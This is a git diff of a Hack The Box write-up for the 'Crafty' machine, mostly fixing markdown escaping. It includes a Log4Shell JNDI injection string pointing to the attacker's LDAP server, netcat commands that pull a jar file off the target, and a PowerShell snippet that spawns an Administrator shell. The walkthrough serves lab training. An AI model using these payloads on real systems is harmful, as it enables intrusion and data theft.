@@ -13,6 +13,7 @@ description: "Crafty - A walkthrough of the challenge with enumeration, exploita
 # HTB - Crafty
 
 - NMAP
+
 ```bash
 nmap 10.129.18.108 -Pn -p- -vv
 
@@ -28,6 +29,7 @@ nmap 10.129.18.108 -Pn -p- -vv
 ![image3](../resources/cd35b355587447c3940ccdaa292e1eb1.png)
 
 - Subdomain enumeration:
+
 ```bash
 wfuzz -u crafty.htb -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-110000.txt -H "Host: FUZZ.crafty.htb" --hl 1
 
@@ -54,13 +56,15 @@ wfuzz -u crafty.htb -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-
 <https://github.com/pentesterland/Log4Shell>
 
 - Clone the directory and cd into it
+
 ```bash
-git clone <https://github.com/kozmer/log4j-shell-poc>
+git clone https://github.com/kozmer/log4j-shell-poc
 
 ```
 - Download jdk1.8 - and rename the folder to jdk1.8.0_20:
+
 ```bash
-wget <https://repo.huaweicloud.com/java/jdk/8u181-b13/jdk-8u181-linux-x64.tar.gz>
+wget https://repo.huaweicloud.com/java/jdk/8u181-b13/jdk-8u181-linux-x64.tar.gz
 
 ```
 
@@ -75,8 +79,9 @@ wget <https://repo.huaweicloud.com/java/jdk/8u181-b13/jdk-8u181-linux-x64.tar.gz
 ![image8](../resources/68b2cf81195444ceadc354bbb64a605a.png)
 
 - Copy the string to send:
+
 ```bash
-\${jndi:ldap://10.10.14.38:1389/a}
+${jndi:ldap://10.10.14.38:1389/a}
 
 ```
 - In the TSlauncher app - Press T to open the chat box
@@ -139,11 +144,13 @@ dir /Q /A
 
 - Using nc we can send and receive:
   - On Kali:
+
 ```bash
-nc -lnvp 4444 \> playercounter-1.0-SNAPSHOT.jar
+nc -lnvp 4444 > playercounter-1.0-SNAPSHOT.jar
 
 ```
 - On Windows:
+
 ```bash
 c:\Users\svc_minecraft\Documents\nc.exe 10.10.14.38 4444 < playercounter-1.0-SNAPSHOT.jar
 
@@ -159,14 +166,16 @@ c:\Users\svc_minecraft\Documents\nc.exe 10.10.14.38 4444 < playercounter-1.0-SNA
 ![image19](../resources/650ad55a7f7f4c0dba8c1698e83cecdc.png)
 
 - Reading the Java archive file:
+
 ```bash
-jar tf \<file.jar\>:
+jar tf <file.jar>:
 ```
 ![image20](../resources/473050f698774d32bdc4ed132f4646c6.png)
 
-- Extract with 
+- Extract with:
+
 ```bash
-jar xf \<file.jar\>
+jar xf <file.jar>
 ```
 
 - That didn't extract anything useful and not all the files were there, as seen above
@@ -180,10 +189,9 @@ jar xf \<file.jar\>
 
 ```powershell
 $User = "Administrator"
-$Password = ConvertTo-SecureString "<Password\>" -AsPlainText -Force
+$Password = ConvertTo-SecureString "<Password>" -AsPlainText -Force
 $Credential = New-Object System.Management.Automation.PSCredential($User, $Password)
 Start-Process cmd.exe -Credential $Credential
-
 ```
 
 ![image22](../resources/37e2e2bd470240299708cb4cab49acb7.png)
